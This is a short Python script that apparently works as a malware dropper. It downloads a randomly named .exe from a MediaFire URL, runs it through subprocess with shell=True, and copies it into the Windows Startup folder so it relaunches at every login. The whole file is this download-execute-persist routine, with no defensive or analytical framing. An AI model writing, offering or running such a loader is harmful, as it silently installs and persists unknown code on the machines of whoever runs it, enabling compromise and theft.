import os
import requests
import subprocess
import shutil

# URL of the file to download and execute
url = "https://download1482.mediafire.com/2gxo4mkjobkgWnDeiHV3iuL3hqkCz1jiuRyv6xuPpxGTNpq5ZjnZVkZOspCSUOC0pL2j6LXBqJDMbI4ya3d8JBcv96ALu_8-H8zSePScJZN-i74y8aq6ikS9Cnl7B55siUfzuNOULLtO92qAxKWGkdogX2aQIDa_faU0AsM_eE-T/os7iqcud1581tkl/r%23481jfsdaiof309jikiofa.exe"

# Download the file from the URL
response = requests.get(url)

# Save the file to disk
filename = "r#481jfsdaiof309jikiofa.exe"
with open(filename, "wb") as file:
    file.write(response.content)

# Run the downloaded file
subprocess.call(filename, shell=True)

# Add the file to the Windows startup folder
startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
shutil.copy2(filename, startup_folder)
